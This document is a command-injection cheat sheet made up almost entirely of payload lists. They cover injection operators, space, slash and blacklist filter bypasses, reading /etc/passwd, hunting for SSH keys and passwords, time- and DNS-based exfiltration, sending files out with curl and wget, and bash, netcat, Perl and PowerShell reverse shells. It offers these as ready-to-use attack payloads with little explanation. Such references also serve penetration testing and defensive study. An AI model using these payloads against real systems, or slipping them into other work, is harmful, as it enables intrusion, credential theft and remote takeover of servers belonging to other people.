---

> Detection

```bash
# Basic test payloads
127.0.0.1; whoami
127.0.0.1 && whoami
127.0.0.1 || whoami
127.0.0.1 | whoami
127.0.0.1 %0a whoami     # newline
127.0.0.1$(whoami)       # subshell
127.0.0.1`whoami`        # backticks
```
> Injection Operators

```c
# Both Unix & Windows
127.0.0.1; id            # run both (Linux only on CMD)
127.0.0.1 && id          # run 2nd if 1st succeeds
127.0.0.1 || id          # run 2nd if 1st fails
127.0.0.1 & id           # run in background
127.0.0.1 | id           # pipe output
127.0.0.1 %0a id         # newline URL encoded

# Linux only
127.0.0.1$(id)
127.0.0.1`id`
```
> File Interaction

```c
# Redirect or read files
> /var/www/html/out.txt
< /etc/passwd
cat /etc/passwd
```

> Time-Based Exfiltration

```c
time if [ $(whoami|cut -c1) == s ]; then sleep 5; fi
time if [ $(whoami|cut -c1) == a ]; then sleep 5; fi
```

> DNS-Based Exfiltration

```c
for i in $(ls /); do host "$i.<yourid>.dnsbin.zhack.ca"; done
```

> Bypassing Filters

```c
# Space bypass
127.0.0.1%0a%09whoami        # tab
127.0.0.1%0a${IFS}whoami     # IFS variable
127.0.0.1%0a{ls,-la}         # brace expansion

# Slash bypass
${PATH:0:1}etc${PATH:0:1}passwd   # extracts '/' from $PATH
```

> Bypassing Command Blacklists

```c
# Insert ignored characters
w'h'o'am'i
w"h"o"am"i
who$@ami
w\ho\am\i
who^ami              # Windows

# Case tricks
WhOaMi
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

# Reverse tricks
$(rev<<<'imaohw')

# Encoded
echo -n 'cat /etc/passwd' | base64
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)
```

> Windows Tricks

```c
# Reverse execution
"whoami"[-1..-20] -join ''
iex "$('imaohw'[-1..-20] -join '')"

# Base64 execution
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<b64>')))"
```


> Reading Files with Bypasses

```bash
# Normal read
127.0.0.1; cat /etc/passwd                (cat /etc/passwd)

# Using subshell
127.0.0.1$(cat /etc/passwd)               (cat /etc/passwd)
127.0.0.1`cat /etc/passwd`                (cat /etc/passwd)

# No spaces (space filter bypass)
127.0.0.1%0acat${IFS}/etc/passwd          (cat /etc/passwd)
127.0.0.1%0a{cat,/etc/passwd}             (cat /etc/passwd)

# Slash filter bypass with $PATH variable
127.0.0.1%0acat${PATH:0:1}etc${PATH:0:1}passwd   (cat /etc/passwd)

# Using tabs instead of spaces
127.0.0.1%0acat%09/etc/passwd             (cat /etc/passwd)

# Character insertion bypass (blacklist "cat")
127.0.0.1%0ac'a't /etc/passwd             (cat /etc/passwd)
127.0.0.1%0ac"at" /etc/passwd             (cat /etc/passwd)
127.0.0.1%0ac\at /etc/passwd              (cat /etc/passwd)

# Base64 encoding to avoid bad characters
127.0.0.1%0aecho%09Y2F0IC9ldGMvcGFzc3dk|base64%20-d|bash   (cat /etc/passwd)

# Reverse trick to avoid word "cat"
127.0.0.1%0a$(rev<<<'tac') /etc/passwd    (tac /etc/passwd → prints reversed file content)

# Using grep to leak specific lines
127.0.0.1%0agre${IFS}p${IFS}root /etc/passwd   (grep root /etc/passwd)
```

> Listing Directories

```c
# No spaces
127.0.0.1%0als${IFS}-la${IFS}/tmp                  (ls -la /tmp)

# Brace expansion
127.0.0.1%0a{ls,-la,/}                             (ls -la /)

# Blacklist bypass
127.0.0.1%0al's' /etc                              (ls /etc)
```

> Finding Sensitive Files

```c
# No spaces
127.0.0.1%0afind${IFS}/${IFS}-name${IFS}id_rsa     (find / -name id_rsa)

# Grep passwords (space blocked)
127.0.0.1%0agre${IFS}-i${IFS}password${IFS}/etc/passwd   (grep -i password /etc/passwd)

# Grep with tab instead of space
127.0.0.1%0agre%09-i%09password%09/etc/passwd     (grep -i password /etc/passwd)
```

> Exfiltrating Data

```c
# Curl (space bypass)
127.0.0.1%0acurl${IFS}-d@/etc/passwd${IFS}http://<IP>/upload   (curl -d@/etc/passwd http://<IP>/upload)

# Wget (tab instead of space)
127.0.0.1%0awget%09--post-file=/etc/passwd%09http://<IP>/upload   (wget --post-file=/etc/passwd http://<IP>/upload)

# Base64 + curl (slash & space bypass)
127.0.0.1%0acat${IFS}/etc/passwd|base64|curl${IFS}-d@-${IFS}http://<IP>/upload   (exfil passwd via base64 → curl)
```

> Reverse Shells

```c
# Bash reverse shell (space bypass)
127.0.0.1%0abash${IFS}-i>&/dev/tcp/<IP>/<PORT>0>&1   (bash -i >& /dev/tcp/IP/PORT 0>&1)

# Netcat reverse shell (blacklist bypass with quotes)
127.0.0.1%0an'c'${IFS}<IP>${IFS}<PORT>${IFS}-e${IFS}/bin/bash   (nc IP PORT -e /bin/bash)

# Perl reverse shell (no spaces using ${IFS})
127.0.0.1%0aperl${IFS}-e'use${IFS}Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">${IFS}S");open(STDOUT,">${IFS}S");open(STDERR,">${IFS}S");exec("/bin/sh${IFS}-i");};'
```

> Privilege Checks

```c
# Who am I
127.0.0.1%0awho'am'i                        (whoami)

# ID info
127.0.0.1%0ai'd'                            (id)

# Sudo privileges (no space)
127.0.0.1%0asudo${IFS}-l                    (sudo -l)
```

> Windows Payloads with Bypasses

```c
# Read hosts file (insert ^ bypass)
127.0.0.1 & ty^pe C:\Windows\System32\drivers\etc\hosts   (type hosts)

# List directory (insert ^ bypass)
127.0.0.1 & d^ir C:\Users                                (dir C:\Users)

# Find users
127.0.0.1 & net us^er                                    (net user)

# PowerShell reverse shell (no spaces)
127.0.0.1 & powershell${IFS}-nop${IFS}-c"$client=New-Object${IFS}System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object${IFS}-TypeName${IFS}System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex${IFS}$data${IFS}2>&1${IFS}|${IFS}Out-String);$sendback2=$sendback+'PS${IFS}'+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
```






